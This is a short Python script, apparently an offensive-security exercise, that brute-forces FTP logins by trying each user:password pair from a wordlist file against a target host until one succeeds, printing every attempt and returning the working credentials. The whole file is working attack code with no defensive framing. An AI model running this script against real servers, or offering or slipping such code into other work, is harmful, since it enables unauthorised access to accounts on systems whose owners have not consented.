import ftplib

def bruteForceLogin(hostname, passwordFile):
    passList = open(passwordFile, 'r')
    for line in passList.readlines():
        user_name = line.split(":")[0]
        pass_word = line.split(":")[1].strip('\r').strip('\n')
        print("[+] Trying: " + str(user_name) + "/" + str(pass_word))
        
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(user_name, pass_word)
            print("FTP Login succeded: " + str(user_name) + "/" + str(pass_word) )
            ftp.quit()
            return(user_name, pass_word)
        
        except Exception:
            pass

if __name__ == '__main__':
    hostname = "123" # Provide an actual FTP ip address
    passwordFile = "passwordFile.txt"
    bruteForceLogin(hostname, passwordFile)

